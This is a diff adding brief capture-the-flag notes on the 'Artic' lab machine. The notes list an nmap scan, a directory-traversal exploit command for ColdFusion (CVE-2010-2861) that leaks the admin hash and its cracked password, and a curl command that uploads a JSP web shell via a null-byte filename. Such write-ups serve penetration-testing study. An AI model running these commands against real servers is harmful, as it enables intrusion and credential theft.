@@ -1,0 +1,16 @@
+Artic
+- nmap -A -T4 -Pn 10.10.10.11
+	- port 139 - rpc
+	- port 8500 - http
+	- port 49154 - rpc
+- running "Adobe ColdFusion" web app development platform
+- Directory traversal vuln. for ColdFusion: CVE-2010-2861
+	- https://www.exploit-db.com/exploits/14641
+- Metasploit's local_exploit_suggester can be used to list possible priv. escalation paths on compromised machine
+- *python2 14641.py 10.10.10.11 8500 ../../../../../../../lib/password.properties* <-- exploit the directory traversal vul.
+	- outputs admin user hash: *password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03*
+- cracked with https://hashes.com/en/decrypt/hash, but could also use john or hashcat
+	- 2f635f6d20e3fde0c53075a84b68fb07dcec9b03:***happyday***
+- google: codfusion admin login page reveals the path: http://10.10.10.11:8500/CFIDE/administrator/ <-- to login with newly acquired credentials
+- within the admin console, we can navigate to "Scheduled Tasks" 
+curl -X POST -F "newfile=@shell.jsp;type=application/x-java-archive;filename=shell.txt" 'http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/df.jsp%00'
